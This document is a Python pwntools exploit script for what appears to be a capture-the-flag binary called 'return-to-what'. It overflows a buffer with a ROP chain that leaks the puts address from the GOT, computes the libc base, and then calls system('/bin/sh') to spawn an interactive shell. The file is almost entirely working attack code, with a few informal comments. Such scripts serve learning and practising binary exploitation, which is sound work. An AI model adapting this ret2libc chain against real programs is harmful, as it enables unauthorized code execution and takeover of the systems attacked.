from pwn import *

import pprint

#defining the architecture
context.update(arch='amd64', os='linux')
context.log_level = 'debug'

#these are the rop gadgets having pop instructions
'''
0x0000000000401224 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401226 : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401228 : pop r14 ; pop r15 ; ret
0x000000000040122a : pop r15 ; ret
0x0000000000401223 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401227 : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000401129 : pop rbp ; ret
0x000000000040122b : pop rdi ; ret
0x0000000000401229 : pop rsi ; pop r15 ; ret
0x0000000000401225 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
'''

elf=ELF("./return-to-what")

target=elf.process()

target.recvuntil('\n')
target.recvuntil('\n')

offset=56

#instantiaiting the rop object and buidling the chain
#This rop chain is to leak the address of puts and again call the program so that we can send another payload

pop_rdi=p64(0x000000000040122b)
puts=p64(elf.symbols[b'puts'])
puts_got=p64(elf.got[b'puts'])
main=p64(elf.symbols[b'main'])


payload=b"A"*offset + pop_rdi + puts_got + puts + main
target.sendline(payload)

puts=u64(target.recvuntil('\n').rstrip().ljust(8,b'\x00'))
log.info(f"puts address = {hex(puts)}")

libc=ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

#determining libc base
libc_base=puts-libc.symbols[b"puts"]


log.info(f"libc base : {hex(libc_base)}")

#creating the final rop chain

system = libc_base + libc.symbols[b'system']
bin_sh = libc_base + next(libc.search('/bin/sh'))
puts = libc_base + libc.symbols[b'puts']

#very wierd that with calling puts it doesnt work doesnt actually make sense

rop_chain2 = pop_rdi + p64(bin_sh) + p64(puts) + pop_rdi + p64(bin_sh) + p64(system)

log.info(f'system address : {hex(system)}')
log.info(f'/bin/sh string at : {hex(bin_sh)}')


#print(System: hex(libc.symbols[b'system']))

payload1=b"A"*56 + rop_chain2

#gdb.attach(target)

target.sendline(payload1)

target.interactive()

